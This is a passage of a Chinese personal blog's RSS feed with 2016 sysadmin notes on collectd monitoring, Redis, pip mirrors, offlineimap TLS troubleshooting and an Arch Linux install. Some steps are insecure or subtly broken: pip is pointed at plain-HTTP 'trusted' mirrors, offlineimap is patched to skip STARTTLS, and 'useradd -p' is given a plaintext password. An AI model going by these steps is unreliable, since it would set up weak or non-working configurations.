<li>同步完成后进行 Master-Slave 换位</li>
</ul>


<ul class="org-ul">
<li>应用（app）会自动切到新的 redis 实例</li>
</ul>


<ul class="org-ul">
<li>旧的 redis 实例可以停掉</li>
</ul>
</div>
</div>


<div id="outline-container-org9007939" class="outline-2">
<h2 id="org9007939">参考</h2>
<div class="outline-text-2" id="text-org9007939">
<ul class="org-ul">
<li><a href="http://stackoverflow.com/questions/16221563/whats-the-point-of-multiple-redis-databases">What's the Point of Multiple Redis Databases? - Stack Overflow</a></li>
</ul>


<ul class="org-ul">
<li><a href="https://groups.google.com/d/msg/redis-db/vS5wX8X4Cjg/8ounBXitG4sJ">database names? - Google 网上论坛</a></li>
</ul>


<ul class="org-ul">
<li><a href="http://redis.io/topics/partitioning">Partitioning: how to split data among multiple Redis instances. – Redis</a></li>
</ul>


<ul class="org-ul">
<li><a href="http://oldblog.antirez.com/post/redis-presharding.html">Redis Presharding</a></li>
</ul>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Archlinux 的 collectd 支持监控 redis]]></title>
            <link>/article/archlinux-7684-collectd-652f630176d163a7-redis.html</link>
            <guid>/article/archlinux-7684-collectd-652f630176d163a7-redis.html</guid>
            <pubDate>Thu, 31 Mar 2016 09:44:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
Archlinux 下使用 <code>pacman</code> 安装的 <code>collectd</code> 没有 redis 插件。
</p>

<p>
查看 collectd 的 <a href="https://projects.archlinux.org/svntogit/community.git/tree/trunk/PKGBUILD?h=packages/collectd">PKGBUILD</a> 文件，并未明令禁止 redis 插件，从源代码编译安装的话，只要系统装了 <code>hiredis</code> ，redis 插件应该就会自动启用。
</p>

<p>
所以我们需要从源代码编译安装 <code>collectd</code> 软件包。
</p>

<div id="outline-container-orge0f868e" class="outline-2">
<h2 id="orge0f868e">安装 ABS</h2>
<div class="outline-text-2" id="text-orge0f868e">
<blockquote>
<p>
What is the Arch Build System?
</p>

<p>
The Arch Build System is a ports-like system for building and packaging software from source code. While pacman is the specialized Arch tool for binary package management (including packages built with the ABS), ABS is a collection of tools for compiling source into installable .pkg.tar.xz packages.    
</p>
</blockquote>
<p>
引用自 <a href="https://wiki.archlinux.org/index.php/Arch_Build_System">Arch Build System - ArchWiki</a>
</p>

<div class="org-src-container">
<pre class="src src-sh">yaourt -S abs
sudo abs
</pre>
</div>
</div>
</div>

<div id="outline-container-org40ab8ac" class="outline-2">
<h2 id="org40ab8ac">编译安装 collectd</h2>
<div class="outline-text-2" id="text-org40ab8ac">
<div class="org-src-container">
<pre class="src src-sh"><span class="linenr">1: </span>yaourt -S hiredis
<span class="linenr">2: </span>cp -R /var/abs/community/collectd ~/
<span class="linenr">3: </span><span style="color: #b294bb;">cd</span> ~/collectd
<span id="coderef-archlinux_makepkg" class="coderef-off"><span class="linenr">4: </span>makepkg</span>
<span class="linenr">5: </span>yaourt -U ./collectd-5.5.1-2-x86_64.pkg.tar.xz
</pre>
</div>

<dl class="org-dl">
<dt>行 <a href="#coderef-archlinux_makepkg" class="coderef" onmouseover="CodeHighlightOn(this, 'coderef-archlinux_makepkg');" onmouseout="CodeHighlightOff(this, 'coderef-archlinux_makepkg');">4</a> </dt><dd>如果报 <code>Missing dependencies</code> 错误则按提示使用 pacman 装上缺失的依赖项</dd>
</dl>
</div>
</div>

<div id="outline-container-org066fcc3" class="outline-2">
<h2 id="org066fcc3">使用以前的 collectd 配置</h2>
<div class="outline-text-2" id="text-org066fcc3">
<p>
重新安装 collectd 后，以前的配置保存在 <code>/etc/collectd.conf.pacsave</code> ，恢复一下
</p>
<div class="org-src-container">
<pre class="src src-sh">sudo mv /etc/collectd.conf.pacsave /etc/collectd.conf
</pre>
</div>
</div>
</div>

<div id="outline-container-org92823d3" class="outline-2">
<h2 id="org92823d3">启用 collectd 插件</h2>
<div class="outline-text-2" id="text-org92823d3">
<p>
修改 collectd 配置文件 <code>/etc/collectd.conf</code> 
</p>
<pre class="example">
LoadPlugin redis

&lt;Plugin redis&gt;
  &lt;Node "db"&gt;
     Host "127.0.0.1"
     Port "6379"
     Timeout 2000
  &lt;/Node&gt;
&lt;/Plugin&gt;
</pre>

<p>
重启 collectd 服务，现在可以在界面上看到 redis 的监控项了。
</p>
</div>
</div>

<div id="outline-container-org4554617" class="outline-2">
<h2 id="org4554617">参考</h2>
<div class="outline-text-2" id="text-org4554617">
<ul class="org-ul">
<li><a href="http://arch.acgtyrant.com/2013/12/26/soul/">Arch Linux 的靈魂：PKGBUILD、AUR 和 ABS | Tyrant's Arch Linux</a></li>
</ul>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[使用 collectd 进行服务监控]]></title>
            <link>/article/4f7f7528-collectd-8fdb884c670d52a176d163a7.html</link>
            <guid>/article/4f7f7528-collectd-8fdb884c670d52a176d163a7.html</guid>
            <pubDate>Thu, 31 Mar 2016 04:39:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
collectd 的官网 <a href="https://collectd.org/">collectd.org</a> 。
</p>

<div id="outline-container-org1733ed9" class="outline-2">
<h2 id="org1733ed9">collectd 服务</h2>
<div class="outline-text-2" id="text-org1733ed9">
<ul class="org-ul">
<li><p>
安装
</p>

<div class="org-src-container">
<pre class="src src-sh">yaourt -S collectd
</pre>
</div></li>

<li><p>
启动
</p>

<div class="org-src-container">
<pre class="src src-sh">sudo systemctl enable collectd
sudo systemctl start collectd
</pre>
</div></li>
</ul>
</div>
</div>

<div id="outline-container-org2c33c5a" class="outline-2">
<h2 id="org2c33c5a">collectd 界面</h2>
<div class="outline-text-2" id="text-org2c33c5a">
</div>
<div id="outline-container-org7b85acd" class="outline-3">
<h3 id="org7b85acd"><a href="http://blog.kankanan.com/article/nginx-4e0b5feb901f642d5efa-php-8fd0884c73af5883.html">nginx下快速搭建php运行环境</a></h3>
</div>

<div id="outline-container-orgf346333" class="outline-3">
<h3 id="orgf346333">安装 rrdtool</h3>
<div class="outline-text-3" id="text-orgf346333">
<div class="org-src-container">
<pre class="src src-sh">yaourt -S rrdtool
</pre>
</div>
</div>
</div>

<div id="outline-container-org0714ffc" class="outline-3">
<h3 id="org0714ffc">下载 GCP</h3>
<div class="outline-text-3" id="text-org0714ffc">
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b294bb;">cd</span> /usr/share/nginx/html/
sudo git clone https://github.com/pommi/CGP.git
</pre>
</div>
</div>
</div>

<div id="outline-container-org8340f8b" class="outline-3">
<h3 id="org8340f8b">配置 GCP</h3>
<div class="outline-text-3" id="text-org8340f8b">
<p>
修改配置文件 /usr/share/nginx/html/CGP/conf/config.php
</p>
<pre class="example">
# collectd's datadir
$CONFIG['datadir'] = '/var/lib/collectd/rrd';
</pre>
<p>
改为
</p>
<pre class="example">
# collectd's datadir
$CONFIG['datadir'] = '/var/lib/collectd';
</pre>
</div>
</div>

<div id="outline-container-org5bed0c1" class="outline-3">
<h3 id="org5bed0c1">打开界面</h3>
<div class="outline-text-3" id="text-org5bed0c1">
<p>
浏览器打开页面 <a href="http://localhost/CGP/index.php">http://localhost/CGP/index.php</a> ，可以看到服务器自身的监控信息。
</p>
</div>
</div>
</div>

<div id="outline-container-org909095e" class="outline-2">
<h2 id="org909095e">collectd 插件</h2>
<div class="outline-text-2" id="text-org909095e">
<p>
collectd 支持很多 <a href="https://collectd.org/wiki/index.php/Table_of_Plugins">插件</a> ，使用 c 语言开发插件请参考 <a href="https://collectd.org/wiki/index.php/Plugin_architecture">Plugin architecture - collectd Wiki</a>。
</p>

<p>
<a href="https://collectd.org/wiki/index.php/Plugin:Exec">Exec</a> 插件使用 shell 脚本来收集系统监控数据。
</p>

<p>
以监控电池电量为例。
</p>
</div>

<div id="outline-container-org263b899" class="outline-3">
<h3 id="org263b899">启用 Exec 插件</h3>
<div class="outline-text-3" id="text-org263b899">
<p>
修改 collectd 配置文件 /etc/collectd.conf
</p>
<pre class="example">
LoadPlugin exec
&lt;Plugin exec&gt;
   Exec "nobody:nobody" "/usr/bin/power-capacity"
&lt;/Plugin&gt;
</pre>
</div>
</div>

<div id="outline-container-orgadedb42" class="outline-3">
<h3 id="orgadedb42">监控笔记本电量脚本</h3>
<div class="outline-text-3" id="text-orgadedb42">
<p>
<code>/usr/bin/power-capacity</code>
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #969896; font-style: italic;">#</span><span style="color: #969896; font-style: italic;">!/bin/</span><span style="color: #b5bd68;">bash</span>

<span style="color: #f0c674;">HOSTNAME</span>=<span style="color: #8abeb7;">"${COLLECTD_HOSTNAME:-localhost}"</span>
<span style="color: #f0c674;">INTERVAL</span>=<span style="color: #8abeb7;">"${COLLECTD_INTERVAL:-60}"</span>

<span style="color: #b5bd68;">while</span> sleep <span style="color: #8abeb7;">"$INTERVAL"</span>; <span style="color: #b5bd68;">do</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #f0c674;">VALUE</span>=$(<span style="color: #b294bb;">echo</span> -n <span style="color: #b294bb;">`cat /sys/class/power_supply/BAT0/capacity`</span>)
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b294bb;">echo</span> <span style="color: #8abeb7;">"PUTVAL \"$HOSTNAME/power/capacity\" interval=$INTERVAL N:$VALUE"</span>
<span style="color: #b5bd68;">done</span>
</pre>
</div>

<p>
为脚本添加可执行权限
</p>
<div class="org-src-container">
<pre class="src src-sh">sudo chmod a+x /usr/bin/power-capacity
</pre>
</div>
</div>
</div>

<div id="outline-container-orgdb36b72" class="outline-3">
<h3 id="orgdb36b72">重启 collectd 生效插件</h3>
<div class="outline-text-3" id="text-orgdb36b72">
<div class="org-src-container">
<pre class="src src-sh">sudo systemctl restart collectd
</pre>
</div>

<p>
过一会儿就可以在界面上看到电量监控项。
</p>
</div>
</div>
</div>

<div id="outline-container-org3c77eb8" class="outline-2">
<h2 id="org3c77eb8">collectd 多机器监控</h2>
<div class="outline-text-2" id="text-org3c77eb8">
<p>
监控本机没有什么用处，通过 network 插件，可以将 collectd 配置为服务器或客户端。
</p>

<ul class="org-ul">
<li><p>
collectd 服务器
</p>

<p>
接受 collectd 客户端的上报的数据。
</p></li>

<li><p>
collectd 客户端
</p>

<p>
上报数据到 collectd 服务器。
</p></li>
</ul>
</div>

<div id="outline-container-org3533e5e" class="outline-3">
<h3 id="org3533e5e">本机配置为 collectd 服务器</h3>
<div class="outline-text-3" id="text-org3533e5e">
<p>
通过 <a href="https://collectd.org/documentation/manpages/collectd.conf.5.shtml#plugin_network">network</a> 插件配置为 server 端。
</p>

<p>
修改 collectd 配置文件 /etc/collectd.conf 
</p>
<pre class="example">
LoadPlugin network

&lt;Plugin network&gt;
    &lt;Listen "0.0.0.0" "25826"&gt;
        SecurityLevel Sign
        AuthFile "/etc/collectd/passwd"
    &lt;/Listen&gt;
&lt;/Plugin&gt;
</pre>

<p>
创建密码文件
<code>/etc/collectd/passwd</code>
</p>
<pre class="example">
user0: foo
user1: bar
</pre>

<p>
重启 collectd 服务，生效配置。
</p>
</div>
</div>

<div id="outline-container-org7f504eb" class="outline-3">
<h3 id="org7f504eb">其它机器配置为 collectd 客户端</h3>
<div class="outline-text-3" id="text-org7f504eb">
<p>
参考前面的 <a href="#org1733ed9">collectd 服务</a> 一节安装 collectd。
</p>

<p>
通过 <a href="https://collectd.org/documentation/manpages/collectd.conf.5.shtml#plugin_network">network</a> 插件配置为 client 端。
</p>

<p>
修改 collectd 配置文件 /etc/collectd.conf 
</p>
<pre class="example">
LoadPlugin network

&lt;Plugin network&gt;
    &lt;Server "172.17.0.1" "25826"&gt;
        SecurityLevel Encrypt
        Username "user0"
        Password "foo"
    &lt;/Server&gt;
&lt;/Plugin&gt;
</pre>
<p>
服务器的 IP 为 172.17.0.1。
</p>

<p>
重启 collectd 服务，生效配置，等一会儿就可以在界面上看到客户端机器的监控信息。
</p>
</div>
</div>
</div>

<div id="outline-container-org597d832" class="outline-2">
<h2 id="org597d832">参考</h2>
<div class="outline-text-2" id="text-org597d832">
<ul class="org-ul">
<li><a href="https://github.com/pommi/CGP/blob/master/README.md">CGP/README.md at master · pommi/CGP</a></li>

<li><a href="https://collectd.org/wiki/index.php/First_steps">First steps - collectd Wiki</a></li>

<li><a href="http://www.drupal001.com/2012/07/system-monitor-collectd/">Collectd详解、Collectd使用说明、Collectd中文说明 - 系统性能监控利器</a></li>

<li><a href="https://collectd.org/wiki/index.php/Plugin:Exec">Plugin:Exec - collectd Wiki</a></li>

<li><a href="http://blog.sina.com.cn/s/blog_502c8cc40100pbgu.html">collectd使用_新浪研发中心_新浪博客</a></li>

<li><a href="https://collectd.org/documentation/manpages/collectd.conf.5.shtml#global_options">collectd.conf(5) – collectd – The system statistics collection daemon</a></li>
</ul>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Archlinux 下编译 MaidSafe]]></title>
            <link>/article/archlinux-4e0b7f168bd1-maidsafe.html</link>
            <guid>/article/archlinux-4e0b7f168bd1-maidsafe.html</guid>
            <pubDate>Wed, 30 Mar 2016 08:26:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
按照文档 <a href="https://github.com/maidsafe-archive/MaidSafe/wiki/Build-Instructions-for-Linux">Build Instructions for Linux · maidsafe-archive/MaidSafe Wiki</a> 的指示进行。
</p>

<p>
安装 icu-staticlibs 时，由于与已安装的 icu 软件包存在文件冲突，正常安装是装不了的，加上 <code>--force</code> 选项即可
</p>
<div class="org-src-container">
<pre class="src src-sh">yaourt --force -S icu-staticlibs
</pre>
</div>

<p>
编译 master 分枝会出错，切到 next 分枝再编译即可
</p>
<div class="org-src-container">
<pre class="src src-sh">git submodule foreach <span style="color: #8abeb7;">"git checkout next; git pull"</span>
git checkout next; git pull
</pre>
</div>

<p>
参考
</p>

<ul class="org-ul">
<li><a href="https://github.com/maidsafe-archive/MaidSafe/issues/234">make: <b>*</b> {ExperCommon} Error 2 · Issue #234 · maidsafe-archive/MaidSafe</a></li>
</ul>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[使用国内镜像加速 pip]]></title>
            <link>/article/4f7f752856fd5185955c50cf52a0901f-pip.html</link>
            <guid>/article/4f7f752856fd5185955c50cf52a0901f-pip.html</guid>
            <pubDate>Mon, 21 Mar 2016 10:27:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
pip 官方镜像被墙，可以使用用国内镜像进行访问
</p>

<ul class="org-ul">
<li><a href="http://pypi.douban.com/simple/">http://pypi.douban.com/simple/</a></li>

<li><a href="http://mirrors.aliyun.com/pypi/simple/">http://mirrors.aliyun.com/pypi/simple/</a></li>
</ul>


<div id="outline-container-orgfea3ddd" class="outline-2">
<h2 id="orgfea3ddd">命令行指定镜像</h2>
<div class="outline-text-2" id="text-orgfea3ddd">
<div class="org-src-container">
<pre class="src src-sh">pip install -i http://mirrors.aliyun.com/pypi/simple/ --trusted-host mirrors.ali<span style="text-decoration: underline;">yun.com &lt;package&gt;</span>
</pre>
</div>
</div>
</div>

<div id="outline-container-orgc0908f4" class="outline-2">
<h2 id="orgc0908f4">配置文件指定镜像</h2>
<div class="outline-text-2" id="text-orgc0908f4">
<p>
pip 的配置文件为 <code>~/.pip/pip.conf</code>
</p>

<pre class="example">
[global]
index-url = http://mirrors.aliyun.com/pypi/simple/

[install]
trusted-host = mirrors.aliyun.com
</pre>

<p>
使用 pip 安装包时要使用 root 帐号，配置文件实际位置为 <code>/root/.pip/pip.conf</code> 。
</p>

<p>
使用 <code>pip</code> <code>install</code> 命令安装包时，默认会使用配置文件中指定的镜像。
</p>
</div>
</div>

<div id="outline-container-org8362213" class="outline-2">
<h2 id="org8362213">参考</h2>
<div class="outline-text-2" id="text-org8362213">
<ul class="org-ul">
<li><a href="http://www.isaced.com/post-228.html">Pythoner的福利，豆瓣的PyPI源 - isaced</a></li>

<li><a href="http://www.cnblogs.com/yudar/p/4657511.html">linux 设置pip 镜像 Pip Warning：–trusted-host 问题解决方案 - Yudar - 博客园</a></li>
</ul>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[修复 offlineimap 无法收邮件的问题]]></title>
            <link>/article/4fee590d-offlineimap-65e06cd5653690ae4ef6768495ee9898.html</link>
            <guid>/article/4fee590d-offlineimap-65e06cd5653690ae4ef6768495ee9898.html</guid>
            <pubDate>Fri, 18 Mar 2016 02:44:00 GMT</pubDate>
            <content:encoded><![CDATA[
<div id="outline-container-org6212a54" class="outline-2">
<h2 id="org6212a54">不使用 ssl</h2>
<div class="outline-text-2" id="text-org6212a54">
<p>
.offlineimaprc 配置
</p>
<pre class="example">
ssl = no
</pre>


<p>
offlineimap 收邮件出错
</p>
<pre class="example">
$ offlineimap
...
 Establishing connection to imap.xxxxxx.com:143
 ERROR: Could not connect via SSL to host 'imap.xxxxxx.com' and non-standard ssl port 143 configured. Make sure you connect to the correct port.
... 
</pre>
<p>
意外地使用了 ssl 进行连接。
</p>


<p>
telnet 邮件服务器进行诊断
</p>
<pre class="example">
$ telnet imap.xxxxxx.com 143
Connected to imap.xxxxxx.com.
Escape character is '^]'.
* OK [CAPABILITY IMAP4rev1 UIDPLUS CHILDREN NAMESPACE THREAD=ORDEREDSUBJECT THREAD=REFERENCES SORT QUOTA IDLE ACL ACL2=UNION STARTTLS] Courier-IMAP ready. Copyright 1998-2011 Double Precision, Inc.  See COPYING for distribution information.
</pre>
<p>
输出的 CAPABILITY 包含 STARTTLS，应该是邮件服务器配置有误
</p>


<p>
修改 offlineimap 的源代码文件 <a href="file:///usr/lib/python2.7/site-packages/offlineimap/imapserver.py">imapserver.py</a> ，我们的邮箱不使用 tls
</p>
<div class="org-src-container">
<pre class="src src-python">269  <span style="color: #b5bd68;">def</span> <span style="color: #de935f;">__start_tls</span>(<span style="color: #b5bd68;">self</span>, imapobj):
270          <span style="color: #b5bd68;">if</span> <span style="color: #8abeb7;">'STARTTLS'</span> <span style="color: #b5bd68;">in</span> imapobj.capabilities <span style="color: #b5bd68;">and</span> <span style="color: #b5bd68;">not</span> <span style="color: #b5bd68;">self</span>.usessl:
</pre>
</div>

<p>
改成
</p>
<div class="org-src-container">
<pre class="src src-python">269  <span style="color: #b5bd68;">def</span> <span style="color: #de935f;">__start_tls</span>(<span style="color: #b5bd68;">self</span>, imapobj):
270          <span style="color: #b5bd68;">if</span> <span style="color: #8abeb7;">'STARTTLS'</span> <span style="color: #b5bd68;">in</span> imapobj.capabilities <span style="color: #b5bd68;">and</span> <span style="color: #b5bd68;">not</span> <span style="color: #b5bd68;">self</span>.usessl <span style="color: #b5bd68;">and</span> <span style="color: #b5bd68;">self</span>.<span style="text-decoration: underline;">repos.account.name != </span><span style="color: #8abeb7; text-decoration: underline;">'xxxxxx'</span><span style="text-decoration: underline;">:</span>
</pre>
</div>


<ul class="org-ul">
<li><p>
更好的做法
</p>

<p>
在 imap 协议许可的情况下，加强容错性，tls 连接失败后，使用普通连接重连。
.offlineimaprc 新加禁用 tls 的配置项，警告用户服务器可能配置有误，提示用户禁用 tls。
</p></li>

<li><p>
相关的问题
</p>

<p>
<a href="https://github.com/OfflineIMAP/offlineimap/pull/54">Optional TLS by mativs · Pull Request #54 · OfflineIMAP/offlineimap</a>
</p>

<p>
有这个问题的 patch，但是没有下文。
</p></li>

<li><p>
<a href="https://github.com/OfflineIMAP/offlineimap">offlineimap</a> 新加的 starttls 选项解决了这个问题
</p>

<pre class="example">
commit ac2a547ec46d590d041d410723f90f45fcb802fe
Author: Nicolas Sebrecht &lt;nicolas.s-dev@laposte.net&gt;
Date:   Thu Jun 23 03:55:00 2016 +0200

learn to disable STARTTLS

Some servers might have this feature broken.

Github-ref: https://github.com/OfflineIMAP/offlineimap/issues/207
Signed-off-by: Nicolas Sebrecht &lt;nicolas.s-dev@laposte.net&gt;
</pre>

<p>
在 .offlineimaprc 中添加禁用 starttls 配置项
</p>
<pre class="example">
starttls = no
</pre></li>
</ul>
</div>
</div>

<div id="outline-container-orgb2a6572" class="outline-2">
<h2 id="orgb2a6572">使用 ssl</h2>
<div class="outline-text-2" id="text-orgb2a6572">
<p>
.offlineimaprc 配置
</p>
<pre class="example">
ssl = yes
</pre>


<p>
offlineimap 收邮件出错
</p>
<pre class="example">
$ offlineimap
...
 Establishing connection to imap.xxxxxx.com:993
 ERROR: Unknown SSL protocol connecting to host 'imap.xxxxxx.com' for repository 'XxxxxxRemote'. OpenSSL responded:
[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:590)
... 
</pre>
<p>
ssl 证书验证失败。
</p>

<p>
curl 邮件服务器进行诊断
</p>
<pre class="example">
$ curl https://imap.xxxxxx.com:993/
curl: (60) SSL certificate problem: self signed certificate
</pre>
<p>
邮件服务器的 ssl 证书是自签名的
</p>

<p>
从服务器提取证书
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b294bb;">echo</span> | openssl s_client -connect imap.xxxxxx.com:993 2&gt;&amp;1 | sed -ne <span style="color: #8abeb7;">'/-BEGIN CER</span><span style="color: #8abeb7; text-decoration: underline;">TIFICATE-/,/-END CERTIFICATE-/p'</span><span style="text-decoration: underline;"> &gt; ~/imap.xxxxxx.com.pem</span>
</pre>
</div>

<p>
.offlineimaprc 指定证书
</p>
<pre class="example">
ssl = yes
sslcacertfile = /home/xxxxxxxx/imap.xxxxxx.com.pem
</pre>


<p>
offlineimap 收邮件出错
</p>
<pre class="example">
$ offlineimap
...
 Establishing connection to imap.xxxxxx.com:993
 ERROR: Unknown SSL protocol connecting to host 'imap.xxxxxx.com' for repository 'XxxxxxRemote'. OpenSSL responded:
[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:590)
...
</pre>
<p>
ssl 证书验证失败。
</p>

<p>
curl 邮件服务器进行诊断
</p>
<pre class="example">
$ curl https://imap.xxxxxx.com:993/ --cacert /home/xxxxxxxx/imap.xxxxxx.com.pem
curl: (60) SSL certificate problem: certificate has expired
</pre>
<p>
邮件服务器的 ssl 证书已过期。
</p>


<p>
提取 ssl 证书指纹
</p>
<pre class="example">
$ openssl x509 -noout -in ~/imap.xxxxxx.com.pem -fingerprint -sha1
SHA1 Fingerprint=XX:XX:XX:XX:XX:XX:XX:XX:XX:XX:XX:XX:XX:XX:XX:XX:XX:XX:XX:XX
</pre>

<p>
.offlineimaprc 使用证书指纹（SHA1 Fingerprint= 后的串剔除冒号再转为小写 ）
</p>
<pre class="example">
ssl = yes
#sslcacertfile = /home/xxxxxxxx/imap.xxxxxx.com.pem
cert_fingerprint = xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
</pre>
<p>
参考 <a href="https://github.com/OfflineIMAP/offlineimap/pull/8">Adding support for multi-fingerprint IMAP servers by Kdecherf · Pull Request #8 · OfflineIMAP/offlineimap</a>
</p>

<p>
offlineimap 收邮件出错
</p>
<pre class="example">
$ offlineimap
 Establishing connection to imap.xxxxxx.com:993
 ERROR: Unknown SSL protocol connecting to host 'imap.xxxxxx.com' for repository 'XxxxxxRemote'. OpenSSL responded:
[SSL: SSL_NEGATIVE_LENGTH] dh key too small (_ssl.c:590)
</pre>
<p>
邮件服务器的 openssl 可能太老了，生成的 DH KEY 文件只有 768 位不安全，需要重新生成更安全的 KEY 文件。
参考 <a href="http://offlineimap-project.alioth.debian.narkive.com/dVTlxZyP/ssl-error-with-offlineimap-version-6-6-1-debian-package">Ssl error with offlineimap version 6.6.1 (debian package)</a>
</p>

<p>
使用 ssl 折腾失败，还是邮件服务器配置问题，除非 offlineimap 支持对服务器不进行安全验证，否则服务器端才能解决。</p>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Thinkpad T540p 安装 Archlinux]]></title>
            <link>/article/thinkpad-t540p-5b8988c5-archlinux.html</link>
            <guid>/article/thinkpad-t540p-5b8988c5-archlinux.html</guid>
            <pubDate>Thu, 17 Mar 2016 10:09:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
如果你是重新安装 Archlinux 则建议在安装前记录一下现有系统的软件列表，方便装完新系统后继续安装需要的软件
</p>

<div class="org-src-container">
<pre class="src src-sh">pacman -Qqe | grep -vx <span style="color: #8abeb7;">"$(</span><span style="color: #b294bb;">pacman</span><span style="color: #8abeb7;"> -Qqm)"</span> &gt; Packages
pacman -Qqm &gt; Packages.aur
</pre>
</div>

<p>
参考
</p>

<ul class="org-ul">
<li><a href="https://wiki.archlinux.org/index.php/migrate_installation_to_new_hardware">Migrate installation to new hardware - ArchWiki</a></li>
</ul>

<div id="outline-container-orgf866531" class="outline-2">
<h2 id="orgf866531">下载 ISO</h2>
<div class="outline-text-2" id="text-orgf866531">
<p>
从 <a href="https://www.archlinux.org">Archlinux 官网</a> 下载最新的安装包 <a href="https://www.archlinux.org/download/">archlinux-2016.03.01-dual.iso</a>
</p>
</div>
</div>

<div id="outline-container-org5f1d329" class="outline-2">
<h2 id="org5f1d329">创建安装盘</h2>
<div class="outline-text-2" id="text-org5f1d329">
<p>
通过 dd 将 ISO 写入 U 盘创建安装盘。
</p>

<p>
参考
</p>

<ul class="org-ul">
<li><a href="https://wiki.archlinux.org/index.php/USB_flash_installation_media_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)#GNU.2FLinux">USB flash installation media (简体中文) - ArchWiki</a></li>
</ul>
</div>
</div>

<div id="outline-container-org003e94b" class="outline-2">
<h2 id="org003e94b">BIOS 启用 UEFI</h2>
</div>

<div id="outline-container-org832495b" class="outline-2">
<h2 id="org832495b">开始安装</h2>
<div class="outline-text-2" id="text-org832495b">
<p>
按照 <a href="https://wiki.archlinux.org/index.php/Beginners'_guide">Beginners' guide - ArchWiki</a> 一步步安装到 <a href="https://wiki.archlinux.org/index.php/Beginners'_guide#Initramfs">Initramfs</a> ，分区分案选 <a href="https://wiki.archlinux.org/index.php/Beginners'_guide#UEFI.2FGPT_examples">UEFI/GPT</a>。
</p>

<p>
<a href="https://wiki.archlinux.org/index.php/Beginners'_guide#Install_a_boot_loader">Install a boot loader</a> 这一步改成 <a href="#orgf5af406">使用 UEFI 做为启动管理器</a> 。
</p>


<p>
针对固态硬盘的优化建议
</p>

<ul class="org-ul">
<li><p>
格式化 ext4 分区时添加选项 4K 对齐
</p>

<div class="org-src-container">
<pre class="src src-sh">mkfs.ext4 -b 4096 /dev/sdXX
</pre>
</div></li>

<li><p>
挂载 ext4 分区时添加选项 discard,noatime
</p>

<div class="org-src-container">
<pre class="src src-sh">mount -t ext4 /dev/sdXX /mnt -o discard,noatime
</pre>
</div>

<p>
noatime 读取文件的时候不修改读取的时间，减少对 ssd 的写入次数
discard 启动 trim
</p></li>
</ul>
</div>
</div>

<div id="outline-container-orgf5af406" class="outline-2">
<h2 id="orgf5af406">使用 UEFI 做为启动管理器</h2>
<div class="outline-text-2" id="text-orgf5af406">
<p>
由于主板直接支持 UEFI 启动，使用 `efibootmgr` 来创建 Boot Loader 不但更简单，而且系统启动更快。
</p>

<p>
参考
</p>

<ul class="org-ul">
<li><a href="https://wiki.archlinux.org/index.php/EFISTUB#Using_UEFI_directly_.28efibootmgr.29">EFISTUB - Using UEFI directly (efibootmgr) - ArchWiki</a></li>

<li><a href="http://superuser.com/questions/912417/i-wanted-to-install-arch-linux-on-a-uefi-gpt-system-and-had-questions-about-the/912435#912435">I wanted to install arch linux on a UEFI/GPT system and had questions about the process - Super User</a></li>
</ul>
</div>

<div id="outline-container-orgff3498f" class="outline-3">
<h3 id="orgff3498f">支持休眠</h3>
<div class="outline-text-3" id="text-orgff3498f">
<p>
在 `efibootmgr` 命令中添加 `resume=/dev/sdaX` 选项，其中 `/dev/sdaX` 为
具体的 `swap` 分区。
</p>

<p>
生成支持 `resume` 的 `initramfs`，修改 <a href="file:///etc/mkinitcpio.conf">file:///etc/mkinitcpio.conf</a> ，在 `HOOKS` 中添
加 `resume` 项，确保放到 `udev` 及 `filesystem` 之后。重新生成 `initramfs`：
</p>
<div class="org-src-container">
<pre class="src src-sh">mkinitcpio -p linux
</pre>
</div>

<p>
另外可能还要修改 `/sys/power/image_size` 的值，默认为 `2/5` 内存大小，创建
`/etc/tmpfiles.d/modify_power_image_size.conf` 内容为:
</p>
<pre class="example">
w /sys/power/image_size - - - - 0
</pre>

<p>
启用笔记本盒盖休眠，编辑 `/etc/systemd/logind.conf`，添加以下配置项
</p>
<pre class="example">
HandleLidSwitch=hibernate
</pre>

<p>
参考
</p>

<ul class="org-ul">
<li><a href="https://bbs.archlinux.org/viewtopic.php?id=210919">Hibernation issue. / Newbie Corner / Arch Linux Forums</a></li>

<li><a href="http://www.cnblogs.com/xiaozhang9/p/6443478.html">Archlinux休眠设置 - whilst - 博客园</a></li>

<li><a href="https://wiki.archlinux.org/index.php/Power_management_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)">Power management (简体中文) - ArchWiki</a></li>
</ul>
</div>
</div>
</div>

<div id="outline-container-org246398f" class="outline-2">
<h2 id="org246398f">开通 sudo 权限组</h2>
<div class="outline-text-2" id="text-org246398f">
<p>
运行 visudo，修改如下
</p>

<pre class="example">
## Uncomment to allow members of group wheel to execute any command
%wheel ALL=(ALL) ALL
</pre>

<dl class="org-dl">
<dt>wheel</dt><dd>为 sudo 权限组</dd>
</dl>
</div>
</div>

<div id="outline-container-org850008e" class="outline-2">
<h2 id="org850008e">创建个人帐号</h2>
<div class="outline-text-2" id="text-org850008e">
<p>
加入 sudo 权限组
</p>

<div class="org-src-container">
<pre class="src src-sh">useradd tangxinfa -m -G wheel -p password
</pre>
</div>

<dl class="org-dl">
<dt>tangxinfa</dt><dd>为个人帐号名称，请自行修改</dd>

<dt>password</dt><dd>为个人帐号密码，请自行修改</dd>

<dt>wheel</dt><dd>为 sudo 权限组</dd>
</dl>


<p>
